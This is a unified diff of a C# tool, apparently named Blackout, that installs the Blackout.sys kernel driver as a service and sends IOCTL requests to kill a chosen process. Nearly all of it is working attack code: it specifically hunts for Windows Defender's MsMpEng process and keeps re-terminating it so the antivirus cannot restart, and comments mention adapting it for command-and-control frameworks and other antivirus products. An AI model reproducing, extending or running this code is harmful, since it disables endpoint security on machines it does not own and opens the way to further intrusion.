@@ -1,50 +1,214 @@
-﻿using System;
+using System;
 using System.Diagnostics;
+using System.IO;
+using System.Reflection;
 using System.Runtime.InteropServices;
-using System.ServiceProcess;
 using System.Threading;
 
 class Program
 {
+    // IOCTL codes
     const uint INITIALIZE_IOCTL_CODE = 0x9876C004;
     const uint TERMINSTE_PROCESS_IOCTL_CODE = 0x9876C094;
 
-    [DllImport("kernel32.dll", SetLastError = true)]
-    static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+    // Service-related constants
+    const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
+    const uint SERVICE_KERNEL_DRIVER = 0x00000001;
+    const uint SERVICE_DEMAND_START = 0x00000003;
+    const uint SERVICE_ERROR_IGNORE = 0x00000000;
+    const uint SERVICE_ALL_ACCESS = 0xF01FF;
+
+    // P/Invoke declarations for driver communication
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    static extern IntPtr CreateFile(
+        string lpFileName,
+        uint dwDesiredAccess,
+        uint dwShareMode,
+        IntPtr lpSecurityAttributes,
+        uint dwCreationDisposition,
+        uint dwFlagsAndAttributes,
+        IntPtr hTemplateFile
+    );
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, ref uint lpInBuffer, uint nInBufferSize, ref uint lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
+    static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        uint dwIoControlCode,
+        ref uint lpInBuffer,
+        uint nInBufferSize,
+        [Out] byte[] lpOutBuffer,
+        uint nOutBufferSize,
+        out uint lpBytesReturned,
+        IntPtr lpOverlapped
+    );
 
-    static void LoadDriver(string driverPath)
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    // P/Invoke declarations for service functions
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern IntPtr OpenSCManagerA(
+        string lpMachineName,
+        string lpDatabaseName,
+        uint dwDesiredAccess
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern IntPtr OpenServiceA(
+        IntPtr hSCManager,
+        string lpServiceName,
+        uint dwDesiredAccess
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern bool QueryServiceStatus(
+        IntPtr hService,
+        out SERVICE_STATUS lpServiceStatus
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern bool StartServiceA(
+        IntPtr hService,
+        uint dwNumServiceArgs,
+        IntPtr lpServiceArgVectors
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    static extern IntPtr CreateServiceA(
+        IntPtr hSCManager,
+        string lpServiceName,
+        string lpDisplayName,
+        uint dwDesiredAccess,
+        uint dwServiceType,
+        uint dwStartType,
+        uint dwErrorControl,
+        string lpBinaryPathName,
+        string lpLoadOrderGroup,
+        IntPtr lpdwTagId,
+        string lpDependencies,
+        string lpServiceStartName,
+        string lpPassword
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool CloseServiceHandle(IntPtr hSCObject);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct SERVICE_STATUS
     {
-        string serviceName = "SharpBlackout";
-        using (ServiceController sc = new ServiceController(serviceName))
+        public uint dwServiceType;
+        public uint dwCurrentState;
+        public uint dwControlsAccepted;
+        public uint dwWin32ExitCode;
+        public uint dwServiceSpecificExitCode;
+        public uint dwCheckPoint;
+        public uint dwWaitHint;
+    }
+
+    // Translated LoadDriver function.
+    // It looks for an existing service named "Blackout". If found, it queries its status and starts it if stopped.
+    // Otherwise, it creates the service using the provided full driver path and starts it.
+    static bool LoadDriver(string driverPath)
+    {
+        const string serviceName = "Blackout";
+
+        // Open the Service Control Manager
+        IntPtr hSCM = OpenSCManagerA(null, null, SC_MANAGER_ALL_ACCESS);
+        if (hSCM == IntPtr.Zero)
         {
-            if (sc.Status == ServiceControllerStatus.Stopped)
+            Console.WriteLine("Failed to open Service Control Manager.");
+            return false;
+        }
+
+        // Check if the service already exists
+        IntPtr hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
+        if (hService != IntPtr.Zero)
+        {
+            Console.WriteLine("Service already exists.");
+
+            // Query service status
+            if (!QueryServiceStatus(hService, out SERVICE_STATUS status))
             {
-                sc.Start();
+                Console.WriteLine("Failed to query service status.");
+                CloseServiceHandle(hService);
+                CloseServiceHandle(hSCM);
+                return false;
+            }
+
+            // If service is stopped, start it (SERVICE_STOPPED == 1)
+            if (status.dwCurrentState == 1)
+            {
+                if (!StartServiceA(hService, 0, IntPtr.Zero))
+                {
+                    Console.WriteLine("Failed to start service.");
+                    CloseServiceHandle(hService);
+                    CloseServiceHandle(hSCM);
+                    return false;
+                }
                 Console.WriteLine("Starting service...");
             }
-            else
-            {
-                Console.WriteLine("Service already running.");
-            }
+
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return true;
         }
+
+        // Service doesn't exist; create it.
+        hService = CreateServiceA(
+            hSCM,
+            serviceName,
+            serviceName,
+            SERVICE_ALL_ACCESS,
+            SERVICE_KERNEL_DRIVER,
+            SERVICE_DEMAND_START,
+            SERVICE_ERROR_IGNORE,
+            driverPath,
+            null,
+            IntPtr.Zero,
+            null,
+            null,
+            null
+        );
+
+        if (hService == IntPtr.Zero)
+        {
+            Console.WriteLine("Failed to create service.");
+            CloseServiceHandle(hSCM);
+            return false;
+        }
+
+        Console.WriteLine("Service created successfully.");
+
+        // Start the newly created service.
+        if (!StartServiceA(hService, 0, IntPtr.Zero))
+        {
+            Console.WriteLine("Failed to start service.");
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return false;
+        }
+        Console.WriteLine("Starting service...");
+
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return true;
     }
 
+    // CheckProcess returns true if a process with the given process ID exists.
     static bool CheckProcess(uint processId)
     {
-        Process[] processes = Process.GetProcesses();
-        foreach (Process process in processes)
+        try
         {
-            if (process.Id == processId)
-            {
-                return true;
-            }
+            Process.GetProcessById((int)processId);
+            return true;
         }
-        return false;
+        catch
+        {
+            return false;
+        }
     }
 
+    // GetPID returns the process ID for the first process matching the given name.
     static uint GetPID(string processName)
     {
         Process[] processes = Process.GetProcessesByName(processName);
@@ -55,98 +219,104 @@ class Program
         return 0;
     }
 
-    // Should work
     static void Main(string[] args)
     {
+        // Validate command-line arguments.
         if (args.Length != 2 || args[0] != "-p")
         {
-            Console.WriteLine("Invalid arguments. Usage: SharpBlackout.exe -p <process_id>");
+            Console.WriteLine("Invalid number of arguments. Usage: Blackout.exe -p <process_id>");
             return;
         }
 
-        uint processId;
-        if (!uint.TryParse(args[1], out processId))
+        if (!uint.TryParse(args[1], out uint processId))
         {
-            Console.WriteLine("Invalid process ID provided.");
+            Console.WriteLine("Invalid process id provided.");
             return;
         }
 
         if (!CheckProcess(processId))
         {
-            Console.WriteLine("Provided process ID does not exist!");
+            Console.WriteLine("Provided process id doesn't exist!");
             return;
         }
 
-        string driverPath = "Blackout.sys"; // Provide the path to the driver, test on how to make it all in mem for C2 Frameworks
-        
-        Console.WriteLine($"Loading {driverPath} driver...");
+        // Locate the driver file ("Blackout.sys") in the current directory.
+        string driverFile = "Blackout.sys";
+        if (!File.Exists(driverFile))
+        {
+            Console.WriteLine("Driver file not found!");
+            return;
+        }
 
-        LoadDriver(driverPath);
+        string fullDriverPath = Path.GetFullPath(driverFile);
+        Console.WriteLine($"Driver path: {fullDriverPath}");
+        Console.WriteLine($"Loading {driverFile} driver ..");
 
-        IntPtr hDevice = CreateFile("\\\\.\\Blackout", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
-        if (hDevice == IntPtr.Zero)
+        if (!LoadDriver(fullDriverPath))
+        {
+            Console.WriteLine("Failed to load driver, try running the program as administrator!");
+            return;
+        }
+        Console.WriteLine("Driver loaded successfully!");
+
+        // Open a handle to the driver using its symbolic link.
+        IntPtr hDevice = CreateFile(@"\\.\Blackout", 0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
+        if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
         {
             Console.WriteLine("Failed to open handle to driver!");
             return;
         }
 
+        // Send the INITIALIZE_IOCTL_CODE command with the process ID.
         uint input = processId;
-        uint output = 0;
-        uint bytesReturned = 0;
-
-        bool result = DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, ref input, sizeof(uint), ref output, sizeof(uint), ref bytesReturned, IntPtr.Zero);
-
-        if (!result)
+        byte[] output = new byte[8]; // buffer for output (adjust size as needed)
+        if (!DeviceIoControl(hDevice, INITIALIZE_IOCTL_CODE, ref input, (uint)Marshal.SizeOf(input), output, (uint)output.Length, out uint bytesReturned, IntPtr.Zero))
         {
-            Console.WriteLine($"Failed to send initializing request {INITIALIZE_IOCTL_CODE:X}!");
+            Console.WriteLine($"Failed to send initializing request 0x{INITIALIZE_IOCTL_CODE:X}!");
+            CloseHandle(hDevice);
             return;
         }
+        Console.WriteLine($"Driver initialized 0x{INITIALIZE_IOCTL_CODE:X}!");
 
-        Console.WriteLine($"Driver initialized {INITIALIZE_IOCTL_CODE:X}!");
-
-        // Look for Defender if any other AV's should make a list
-        uint defenderPid = GetPID("MsMpEng.exe");
-        if (defenderPid == input)
+        // If the target process ID matches Windows Defender's process, repeatedly send termination IOCTL.
+        uint defenderPid = GetPID("MsMpEng");
+        if (defenderPid == processId)
         {
-            Console.WriteLine("Terminating Windows Defender...\nKeep the program running to prevent the service from restarting it.");
-
+            Console.WriteLine("Terminating Windows Defender ..");
+            Console.WriteLine("Keep the program running to prevent the service from restarting it");
+            bool once = true;
             while (true)
             {
-                uint currentDefenderPid = GetPID("MsMpEng.exe");
-                if (currentDefenderPid == input)
+                input = GetPID("MsMpEng");
+                if (input != 0)
                 {
-                    result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, sizeof(uint), ref output, sizeof(uint), ref bytesReturned, IntPtr.Zero);
-
-                    if (!result)
+                    if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, (uint)Marshal.SizeOf(input), output, (uint)output.Length, out bytesReturned, IntPtr.Zero))
                     {
-                        Console.WriteLine($"DeviceIoControl failed. Error: {Marshal.GetLastWin32Error():X}");
+                        Console.WriteLine($"DeviceIoControl failed. Error: 0x{Marshal.GetLastWin32Error():X}");
                         break;
                     }
-
-                    Console.WriteLine("Defender Terminated...");
+                    if (once)
+                    {
+                        Console.WriteLine("Defender Terminated ..");
+                        once = false;
+                    }
                 }
-
                 Thread.Sleep(700);
             }
         }
 
-        Console.WriteLine("Terminating process...");
-
-        result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, sizeof(uint), ref output, sizeof(uint), ref bytesReturned, IntPtr.Zero);
-
-        if (!result)
+        Console.WriteLine("Terminating process ..");
+        if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, ref input, (uint)Marshal.SizeOf(input), output, (uint)output.Length, out bytesReturned, IntPtr.Zero))
         {
-            Console.WriteLine($"Failed to terminate process: {Marshal.GetLastWin32Error():X}");
+            Console.WriteLine($"Failed to terminate process: 0x{Marshal.GetLastWin32Error():X}!");
         }
         else
         {
-            // Shoould be done here
             Console.WriteLine("Process has been terminated!");
         }
 
-        // Keep the program running so Defender doesn't restart
+        Console.WriteLine("Press any key to exit...");
         Console.ReadKey();
-
-        Marshal.FreeHGlobal(hDevice);
+        CloseHandle(hDevice);
     }
 }
